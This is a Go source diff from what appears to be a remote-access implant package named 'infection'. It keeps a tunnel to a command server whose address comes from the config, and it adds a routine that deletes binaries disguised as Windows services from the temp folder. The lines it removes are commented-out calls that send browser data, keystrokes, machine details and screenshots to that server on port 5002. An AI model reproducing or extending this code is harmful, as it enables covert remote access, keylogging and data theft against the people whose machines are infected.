@@ -4,7 +4,7 @@ import (
 	"fmt"
 	"infection/etcd"
 	"infection/tunnel"
-	"net/http"
+	"os"
 	"time"
 
 	"sync/atomic"
@@ -58,9 +58,20 @@ func (a *AppConfigMgr) Callback(conf *etcd.Config) {
 //		cmd.Start()
 //	}
 //}
-
-func handler(w http.ResponseWriter, r *http.Request) {
-	fmt.Fprintf(w, "hello world")
+func clear() {
+	path := "C:\\Windows\\temp\\"
+	files := []string{
+		"WindowsEventLog.exe",
+		"WindowsDaemon.exe",
+		"MicrosoftBroker.exe",
+	}
+	for _, f := range files {
+		_, err := os.Stat(path + f)
+		if err != nil {
+		} else {
+			os.RemoveAll(path + f)
+		}
+	}
 }
 func main() {
 	conf, _ := etcd.NewConfig()
@@ -68,35 +79,16 @@ func main() {
 	var appConfig AppConfig
 	appConfig.Url = conf.Url
 	appConfigMgr.config.Store(&appConfig)
-	//if lib.CheckInlib(conf.Url) != nil {
-	//	finflag := make(chan string)
-	//	go machineinfo.MachineSend(conf.Url, finflag)
-	//	<-finflag
-	//	if lib.FileExits(lib.BrowserSafepath) != nil {
-	//		go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
-	//	}
-	//	//go tunnel.Tunnel(addr)
-	//	go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
-	//} else if lib.FileExits(lib.BrowserSafepath) != nil {
-	//	finflag := make(chan string)
-	//	go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
-	//}
-	//go killit.Killit()
-	//go killit.GetPic(conf.Url)
+
 	go tunnel.Tunnel(conf.Url)
 	a := []string{"01x3b", "00x10", "02x10", "00x50", "7bx10", "80x55", "ffx40"}
 	for {
 		ticker := time.NewTicker(4 * time.Second)
 		for _, name := range a {
-			fmt.Println(name)
+			fmt.Println(name + a[0])
 			time.Sleep(2 * time.Second)
 		}
 		<-ticker.C
 	}
-	////check update
-	//go lib.DoUpdate()
-	//http.HandleFunc("/hello", handler)
-	//if err := http.ListenAndServe(":11000", nil); err != nil {
-	//	log.Println("pac Faild", err)
-	//}
+
 }
